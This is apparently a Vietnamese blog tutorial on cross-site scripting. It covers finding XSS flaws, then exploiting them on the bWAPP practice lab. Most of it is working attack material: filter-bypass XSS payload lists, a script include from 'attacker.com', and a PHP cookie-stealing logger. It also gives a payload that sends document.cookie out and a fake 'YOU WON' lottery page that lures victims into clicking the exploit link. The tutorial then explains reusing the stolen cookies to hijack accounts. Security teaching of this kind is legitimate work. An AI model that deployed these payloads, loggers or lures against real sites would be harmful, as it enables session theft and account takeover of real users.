# Giới thiệu
Lỗi XSS rất phổ biến trong các ứng dụng web, xuất hiện khi ứng dụng nhận
kèm dữ liệu đầu vào từ người dùng qua trang web, rồi gửi đến người khác mà không
thông qua kiểm tra và xử lý. Kẻ tấn công chèn vào các website động (ASP, PHP,
CGI, JSP...) những thẻ HTML hay những đoạn mã script nguy hiểm có thể gây nguy
hại cho những người sử dụng khác. Trong đó, những đoạn mã nguy hiểm đựơc chèn
vào hầu hết được viết bằng các Client-Site Script như JavaScript, JScript, DHTML và
cũng có thể là cả các thẻ HTML. Từ đó, kẻ tấn công có thể thực thi được script trên
trình duyệt của nạn nhân để ăn cắp hay giả mạo phiên làm việc, thêm vào nội dung
xấu, chuyển kết nối, tấn công trình duyệt bằng phần mềm độc hại.
## 1. Xác định lỗi XSS
Tiến hành kiểm tra lỗi XSS với những điểm vào dự đoán từ trước như các thẻ input search, comment... Thử truyền
dữ liệu vào điểm vào ứng dụng, quan sát thông tin trả về để xem có mã nào gửi đi mà
có xuất hiện trở lại. Nếu như có xuất hiện trong phần body thì kiểm tra lỗi liên quan
đến Reflected XSS. Nếu xuất hiện lại trong phần header thì kiểm tra các lỗi liên quan
đến HTTP Header Injection<br>
Trường hợp trong phần body xuất hiện giá trị mà đã gửi lên trong yêu cầu thì
thử xem có thể thực thi được JavaScript bằng cách chèn các thẻ <script></script>.<br>
Thử gửi lên một vài mã tấn công có nội dung khai thác lỗi XSS và quan sát sự
phản hồi từ ứng dụng để xác định ứng dụng có áp dụng các phương thức lọc như thế
nào và khả năng vượt qua.<br>
Nếu như ứng dụng chặn nội dung liên quan đến các thẻ script thì thực hiện
HTML- encoding để thử xem có lọc trường hợp này hay không.<br>
Quan sát các điểm mà ứng dụng lưu trữ dữ liệu liên quan đến tài khoản người
dùng. Ví dụ như: phần comment, lưu thông tin như đổi tên thành viên, chữ ký... Nếu
như việc lưu trữ mà không thực hiện lọc thì có thể thực hiện tấn công Store XSS.<br>
Nếu như ứng dụng có lưu trữ dữ liệu do người dùng nhập vào và sử dụng kết
quả hiển thị cho những lần sau thì thực hiện gửi các mã tấn công liên quan đến XSS
để xem ứng dụng có bị tấn công Store XSS hay không.<br>
Các công cụ có thể phát hiện XSS một cách tự động. Tuy nhiên, mỗi ứng dụng
xây dựng khác nhau và sử dụng những nền tảng khác nhau như Javascript, ActiveX,
Flash và Sliverlight, làm cho việc phát hiện lỗi khó khắn hơn. Cho nên, để đảm bảo
đòi hỏi sự kết hợp giữa kiểm tra mã nguồn, kiểm chứng lại bằng tay bên cạnh những
cách thức tự động.<br>
### Các bước để thực hiện xác định lỗi XSS:
Bước 1: Mở website cần kiểm tra<br>
Bước 2: Bắt đầu kiểm tra, định vị 1 ô tìm kiếm hoặc 1 login form và gửi thông
tin đi (nhập thông tin và nhấn submit hay login hay ok gì đó), ví dụ nhập chữ "XSS"
chẳng hạn hay chữ gì cũng được.<br>
Bước 3: Xác định khả năng site có bị lỗi XSS hay không bằng cách xem thông
tin trả về:<br>
Ví dụ thấy như thế này:<br>
```php
· "Your search for 'XSS' did not find any items"
· "Your search for 'XSS' returned the following results"
· "User 'XSS' is not valid"
· "Invalid login 'XSS'"
```
Hoặc là cái đó mà có dính tới chữ "XSS" mà nhập vào ban đầu thì rất có thể "Alert"
này bị XSS <br>
Còn vài hình thức nữa:<br>
Chú ý các ô input hay các biến ngay trên thanh address ( var=) thấy mấy cái
này thì nhập dữ liệu vào. Hãy thử với những script này:<br>
```php
<script>alert('XSS')</script>
<i*g csstest=javascript:alert('XSS')>
&{alert('XSS')};
```
Bước 4: Chèn code thực sự vào nơi bị lỗi:<br>
Chèn <script>alert('XSS')</script> vào ô ban nãy và nhấn SUBMIT.
Nếu sau đó nhận được 1 popup có chữ "XSS" thì "Alert" này 100% bị dính
XSS. Nhưng xin chú ý, thỉnh thoảng vẫn có trường hợp website đó bị dính XSS
nhưng vẫn không xuất hiện cái popup thì buộc lòng phải VIEW SOURCES (xem mã
nguồn) nó ra để xem. Khi view sources nhớ kiểm tra dòng này
**<script>alert('XSS')</script>**, nếu có thì hết chạy, XSS đây rồi.<br>
Vượt qua cơ chế XSS:<br>
Trong một số trường hợp, dữ liệu trả về xuất hiện trong phần Attribute Value:<br>
`<input type="text" name="state" value="INPUT_FROM_USER">`<br>
Có thể sử dụng mã tấn công sau:<br>
`" onfocus="alert(document.cookie)`<br>
Trường hợp có sử dụng lọc, sử dụng cú pháp khác hoặc cơ chế encoding như:<br>
```php
"%3cscript%3ealert(document.cookie)%3c/script%3e
"><ScRiPt>alert(document.cookie)</ScRiPt>
"><script >alert(document.cookie)</script >
```
Một số trường hợp lọc mà không sử dụng cơ chế đệ quy, ví dụ như lọc từ khóa: <script> nhưng chỉ lọc một lần ( không kiểm tra lại sau khi lọc) thì sử dụng:
**<scr<script>ipt>alert(document.cookie)</script>**
Sử dụng script từ nguồn bên ngoài:<br>
```php
<script src="http://attacker.com/xss.js"></script>
http://www.example.com/?var=<SCRIPT%20a=">"%20SRC="http://www.att
acker.com/xss.js"></SCRIPT>
```
Một số đoạn mã giúp vượt qua cơ chế lọc:
```php
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG SRC="jav ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<<SCRIPT>alert("XSS");//<</SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
\";alert('XSS');//
<INPUT TYPE="IMAGE "SRC="javascript:alert('XSS');">
<IMG SRC='vbscript:msgbox("XSS")'>
<IFRAMESRC="javascript:alert('XSS');"></IFRAME>
```
## 2 Các bước thực hiện khai thác lỗi XSS
Khác với các lỗi khác là gây hại trực tiếp lên hệ thống chứa web site, còn XSS
lại không gây hại đến hệ thống của sever mà đối tượng tấn công chủ yếu của XSS lại
là người dùng.<br>
Ứng dụng Web thường lưu trữ thông tin quan trọng ở cookie. Cookie là mẩu
thông tin mà ứng dụng lưu trên đĩa cứng của người sử dụng. Nhưng chỉ ứng dụng
thiết lập ra cookie thì mới có thể đọc nó. Do đó chỉ khi người dùng đang trong phiên
làm việc của ứng dụng thì hacker mới có cơ hội đánh cắp cookie. Công việc đầu
tiên của hacker là tìm trang đích để dụ người dùng đăng nhập sau khi đã tìm ra lỗ
hổng trên ứng dụng đó.<br>
Sau đây là các bước thực hiện khai thác lỗi XSS:<br>
![](https://images.viblo.asia/237e4a56-1bee-4a18-9718-85e43ff3c94a.png)
<br>
Bước 1: Hacker biết được người dùng đang sử dụng một ứng dụng Web có lỗ
hỏng XSS.<br>
Bước 2: Người dùng nhận được 1 liên kết thông qua email hay trên chính trang
Web (như trên guestbook, banner dễ dàng thêm 1 liên kết do chính hacker tạo ra...).
Thông thường hacker khiến người dùng chú ý bằng những câu kích thích sự tò mò
của người dùng như “ Kiểm tra tài khoản”, “Một phần thưởng hấp dẫn đang chờ ”...<br>
Bước 3: Chuyển nội dung thông tin (cookie, tên, mật khẩu...) về máy chủ
của hacker.<br>
Bước 4: Hacker tạo một chương trình hoặc một trang Web để ghi nhận
những thông tin đã đánh cắp vào 1 tập tin.<br>
Bước 5: Sau khi nhận được thông tin cần thiết, hacker có thể sử dụng để thâm
nhập vào tài khoản của người dùng.<br>
### Kỹ thuật lấy Cookie
   Trước hết chúng ta cần môi trường để thực hành, ở đây mình dùng Bwapp, Bwapp là một ứng dụng web để thực hành khai thác các lỗ hổng web bạn có thể cài đặt [tại đây ](https://sourceforge.net/projects/bwapp/)<br>
    giao diện login bạn đăng nhập vào với tài khoản (bee/bug)<br>
    ![](https://images.viblo.asia/8f6982e9-a12a-41a5-843a-bf6547c5c340.png)<br>
    Tếp theo chọn phần khai thác lỗ hổng XSS - Reflected (GET)<br>
    ![](https://images.viblo.asia/eb7d490b-6bda-456c-9b66-5d769a4ccf79.png)<br>
Giờ chúng ta bắt đầu khai thác<br>
Bước 1: Tạo file đánh cắp cookie có tên là get.php với nội dung:<br>
```php
<?php
    if(isset($_GET['cookie']))
    {
        $cookie = $_GET['cookie'];
        // Mở file cookie.txt, tham số a nghĩa là file này mở chỉ để
        write chứ không scan hay read
        $f=fopen('cookie.txt','a');
        // Ta write địa chỉ trang web mà ở trang đó bị ta chèn script.
        fwrite($f,$_SERVER['HTTP_REFERER']);
        // Ghi giá trị cookie
        fwrite($f,". Cookie la: ".$cookie." \n");
        // Đóng file lại
        fclose($f);
    }
?>
```

File này có nhiệm vụ đánh cắp cookie của trang web và ghi thông tin vào file
cookie.txt<br>
Bước 2: Up các file lên host đã dựng, ở đây mình dùng localhost luôn<br>
UP lên host 2 file get.php và cookie.txt. Trong đó file get.php có nội dung như trên
và file cookie.txt là file rỗng để lưu trữ toàn bộ thông tin của  được gửi về thông
qua mệnh lệnh được đưa ra từ file get.php. Lưu ý, phải chmod file get.txt về 777<br>
Bước 3: Khai thác lỗ hổng XSS<br>
Giả sử up 2 file lên host của site http://localhost/hosttest/get.php thì đoạn mã script ăn cắp
cookies có dạng như sau:<br>
```php
<script>window.open("http://localhost/hosttest/get.php?cookie="+document.cookie)</script>
```
<br> đoạn mã trên gọi đến host của mình đã tạo file get.php , file này sẽ lưu lại cookie
    thử nghiệm đoạn mã nãy bằng cách insert đoạn mã này vào ô input<br>
    ![](https://images.viblo.asia/cdee8035-aba9-40f3-8c1c-d272734714a1.png)

Chèn đọa mã vào site dính lỗi XSS vào file html  gửi cho người dùng lấy cookie của người dùng nếu người dùng đã đăng nhập<br>

```php
<html>
    <head>
        <title>Lottery</title>
    </head
    ><body>
        <h1 align="center">CONGRATULATIONS!!!</h1>
        <h1 align="center">YOU WON!!!</h1>Click this 
        <a
            href='http://localhost/bWAPP/xss_get.php?firstname=%3Cscript%3Ewindow.open%28%22http%3A%2F%2Flocalhost%2Fhosttest%2Fget.php%3Fcookie%3D%22%2Bdocument.cookie%29%3C%2Fscript%3E&lastname=vvv&form=submit'>link</a>
            to see your prize
    </body>
</html>
```
   Khi gửi file html này cho người dùng sẽ hiện giao diện sau:<br>
    ![](https://images.viblo.asia/cffe9559-a496-45a1-8d8a-bb1982c9b7ef.png)<br>
chỉ cần người dùng click vào link thì cookie của người dùng đó sẽ được lưu trong file cookie.txt trên host của bạn:<br>
    ![](https://images.viblo.asia/fec94d02-2aa8-4bb1-a355-d736e5b51d78.png)<br>
 giờ có thể sử dụng cookie đó để đăng nhập mà không cần tài khoản và mật khẩu của người dùng đó.<BR>
**Kết bài**
Cảm ơn mn đã theo dõi<br>
Tài liệu tham khảo: tài liệu môn học phát triển ứng dụng web an toàn - HVTKMM